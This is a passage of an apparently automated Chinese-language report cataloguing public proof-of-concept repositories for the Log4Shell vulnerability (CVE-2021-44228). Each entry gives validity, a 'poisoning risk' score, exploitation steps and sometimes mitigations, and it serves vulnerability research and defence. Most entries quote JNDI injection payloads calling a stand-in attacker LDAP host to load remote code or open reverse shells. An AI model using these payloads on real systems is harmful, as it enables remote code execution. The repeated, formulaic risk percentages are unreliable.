提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

